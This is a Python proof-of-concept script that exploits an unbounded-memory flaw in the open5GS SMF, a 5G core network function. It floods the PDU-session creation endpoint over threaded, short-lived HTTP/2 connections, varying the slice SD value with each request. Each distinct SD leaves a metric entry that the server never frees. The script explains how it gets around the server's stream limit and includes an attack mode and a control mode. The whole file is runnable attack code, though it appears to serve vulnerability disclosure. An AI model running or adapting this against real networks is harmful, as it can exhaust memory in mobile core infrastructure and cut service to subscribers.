"""
open5GS SMF S-NSSAI metric-cardinality memory-leak PoC.

Floods POST /nsmf-pdusession/v1/sm-contexts with SmContextCreateData bodies in
which the client-supplied sNssai.sd is varied per request. The SMF installs a
permanent Prometheus metric instance keyed by (plmn, sst, sd) in the global
metrics_hash_by_slice before validating the subscriber or decoding the NAS
message, and that hash is never evicted — so each distinct SD leaks permanent
memory and one extra /metrics series even though every request fails. Requests
are sent over short-lived h2c connections (chunked, threaded) to sidestep the
server's low MAX_CONCURRENT_STREAMS.

Usage:
    # prerequisites: python3 with the 'h2' package (pip install h2); a running
    # open5GS SMF whose SBI port and metrics port (default 9091) are reachable.

    # attack: N requests, each with a DISTINCT sd (fresh range per run) ->
    # N permanent metric instances + N extra /metrics series
    python3 poc.py --target-ip 172.22.0.7 --sbi-port 7777 \
            --count 8000 --sd-start 0x100000

    # benign control: the SAME sd on every request -> the hash dedups ->
    # series count stays flat, only the counter increments
    python3 poc.py --target-ip 172.22.0.7 --sbi-port 7777 \
            --count 8000 --sd-start 0x0F00FF --control

    Expected output: one [*] line per run ending in
    "sent=<N>/<N> requests in <T>s"; afterwards SMF RSS and the number of
    '^fivegs_smffunction_sm_pdusessioncreationreq{' series on
    http://<target-ip>:9091/metrics are permanently higher by ~one series
    per distinct sd (attack) or unchanged (control).
"""
import argparse
import socket
import ssl
import sys
import time
from concurrent.futures import ThreadPoolExecutor

try:
    import h2.config
    import h2.connection
    import h2.events
    import h2.settings
except ImportError:
    sys.stderr.write("[!] the 'h2' package is required:  pip install h2\n")
    sys.exit(2)

PATH = "/nsmf-pdusession/v1/sm-contexts"


def build_multipart(sd: str, sst: int, supi: str) -> bytes:
    """One valid-enough SmContextCreateData + a minimal 5GSM N1 part.

    The request only has to reach nsmf-handler.c:301 (the metric add). It does NOT
    need to establish a real session: the NAS PDU deliberately under-decodes and the
    whole request fails afterwards, yet the metric instance created at :301 stays."""
    j = (
        '{"supi":"%s","pduSessionId":1,"dnn":"internet",'
        '"sNssai":{"sst":%d,"sd":"%s"},'
        '"servingNfId":"11111111-2222-3333-4444-555555555555",'
        '"guami":{"plmnId":{"mcc":"460","mnc":"09"},"amfId":"010203"},'
        '"serviceName":"Nsmf_PDUSession","servingNetwork":{"mcc":"460","mnc":"09"},'
        '"anType":"3GPP_ACCESS","ratType":"NR",'
        '"ueLocation":{"nrLocation":{"tai":{"plmnId":{"mcc":"460","mnc":"09"},"tac":"000001"},'
        '"ncgi":{"plmnId":{"mcc":"460","mnc":"09"},"nrCellId":"0000000001"}}},'
        '"n1SmMsg":{"contentId":"1"},'
        '"smContextStatusUri":"http://172.22.0.1:7777/nsmf-pdusession/v1/sm-context-status"}'
    ) % (supi, sst, sd)
    boundary = b"BD"
    body = (b"--BD\r\nContent-Type: application/json\r\n\r\n" + j.encode() +
            b"\r\n--BD\r\nContent-Type: application/vnd.3gpp.5gnas\r\nContent-Id: 1\r\n\r\n" +
            bytes([0x2D, 0x01, 0x01, 0xC1]) +   # 5GSM header (EPD, pduSessId, PTI, msgType)
            b"\r\n--BD--\r\n")
    return body


def _submit(conn, sid, ip, port, body):
    conn.send_headers(sid, [
        (":method", "POST"), (":scheme", "http"),
        (":path", PATH), (":authority", f"{ip}:{port}"),
        ("content-type", 'multipart/related; boundary=BD; type="application/json"'),
        ("content-length", str(len(body))),
    ])
    conn.send_data(sid, body, end_stream=True)


def flood_connection(ip, port, bodies, drain_s=1.0):
    """One short-lived h2c connection: submit a chunk of requests, briefly drain so the
    server finishes processing (the metric instance is created during handling), then
    close. Short-lived connections sidestep the server's low MAX_CONCURRENT_STREAMS
    (failed-decode streams are held open, so a single long connection would stall).
    Returns the number of requests submitted."""
    try:
        sock = socket.create_connection((ip, port), timeout=10)
    except OSError:
        return 0
    sock.settimeout(0.4)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    try:
        sock.sendall(conn.data_to_send())
    except OSError:
        sock.close()
        return 0
    sid, sent = 1, 0
    for body in bodies:
        try:
            _submit(conn, sid, ip, port, body)
            sock.sendall(conn.data_to_send())
        except Exception:
            break
        sid += 2
        sent += 1
        try:  # opportunistic non-blocking drain (flow-control / window updates)
            data = sock.recv(65535)
            if data:
                conn.receive_data(data)
                out = conn.data_to_send()
                if out:
                    sock.sendall(out)
        except socket.timeout:
            pass
        except OSError:
            break
    t0 = time.time()
    while time.time() - t0 < drain_s:
        try:
            data = sock.recv(65535)
            if not data:
                break
            conn.receive_data(data)
            out = conn.data_to_send()
            if out:
                sock.sendall(out)
        except socket.timeout:
            continue
        except OSError:
            break
    try:
        sock.close()
    except OSError:
        pass
    return sent


def main():
    ap = argparse.ArgumentParser(
        description="open5GS SMF S-NSSAI metric-cardinality memory-growth PoC")
    ap.add_argument("--target-ip", default="172.22.0.7")
    ap.add_argument("--sbi-port", type=int, default=7777)
    ap.add_argument("--count", type=int, default=3000,
                    help="number of sm-context create requests to send")
    ap.add_argument("--sd-start", type=lambda x: int(x, 0), default=0x100000,
                    help="first 24-bit SD (accepts 0x.. or decimal); use a FRESH range per run")
    ap.add_argument("--sst", type=int, default=1)
    ap.add_argument("--supi", default="imsi-460090000000100")
    ap.add_argument("--control", action="store_true",
                    help="reuse the SAME sd on every request (dedup -> no growth)")
    ap.add_argument("--chunk", type=int, default=48,
                    help="requests per h2c connection (keep below the server stream cap)")
    ap.add_argument("--threads", type=int, default=12,
                    help="parallel short-lived connections")
    ap.add_argument("--drain", type=float, default=1.0,
                    help="seconds to wait for the server to finish processing each connection")
    args = ap.parse_args()

    sd_fixed = "%06X" % args.sd_start
    if args.control:
        sds = [sd_fixed] * args.count
        mode = "CONTROL (identical sd=%s -> hash dedup)" % sd_fixed
    else:
        sds = ["%06X" % (args.sd_start + i) for i in range(args.count)]
        mode = "ATTACK (%d distinct sd %s..%s)" % (
            args.count, sds[0], sds[-1])
    print("[*] target : %s:%d%s" % (args.target_ip, args.sbi_port, PATH))
    print("[*] mode   : " + mode)
    bodies = [build_multipart(sd, args.sst, args.supi) for sd in sds]
    chunks = [bodies[i:i + args.chunk] for i in range(0, len(bodies), args.chunk)]

    t0 = time.time()
    sent = 0
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for n in ex.map(lambda c: flood_connection(
                args.target_ip, args.sbi_port, c, args.drain), chunks):
            sent += n
    print("[*] sent=%d/%d requests in %.1fs"
          % (sent, len(bodies), time.time() - t0))
    print("[*] each distinct sd left a permanent metric instance + hash entry in SMF.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
